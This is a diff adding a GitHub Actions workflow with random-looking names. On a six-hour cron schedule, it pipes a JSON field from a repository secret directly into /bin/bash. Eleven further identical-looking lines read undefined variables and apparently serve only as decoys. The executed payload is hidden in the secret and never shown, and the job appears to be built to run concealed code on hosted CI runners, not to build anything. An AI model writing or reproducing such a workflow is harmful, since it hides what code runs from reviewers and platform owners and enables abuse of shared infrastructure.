@@ -1,0 +1,30 @@
+name: wanxuantong7846
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanxuantong7846
+        env:
+          zdos129: ${{ secrets.zdos129 }}
+        run: |
+          echo $zdos129 | jq -r .xxxd78 | /bin/bash
+          echo $wu3 | jq -r .cg04 | /bin/bash
+          echo $kz30069 | jq -r .ljpm13931 | /bin/bash
+          echo $og991 | jq -r .x214 | /bin/bash
+          echo $aewkz14487 | jq -r .q35338 | /bin/bash
+          echo $omgnr7238 | jq -r .c81 | /bin/bash
+          echo $csp5639 | jq -r .zp174 | /bin/bash
+          echo $ann1 | jq -r .zkfa32679 | /bin/bash
+          echo $fchxq386 | jq -r .bweg2 | /bin/bash
+          echo $yqcub5 | jq -r .tcrcq1791 | /bin/bash
+          echo $wf13721 | jq -r .p16 | /bin/bash
+          echo $h5 | jq -r .kfa3805 | /bin/bash
+
